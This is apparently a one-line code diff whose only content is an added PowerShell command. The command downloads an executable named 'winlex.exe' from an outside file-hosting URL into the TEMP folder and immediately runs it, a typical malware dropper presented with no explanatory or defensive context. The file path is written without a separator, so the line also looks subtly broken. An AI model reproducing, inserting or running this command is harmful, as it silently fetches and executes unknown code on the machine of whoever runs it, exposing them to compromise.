@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/68lJcGFLW',"$env:TEMPwinlex.exe");Start-Process ("$env:TEMPwinlex.exe")
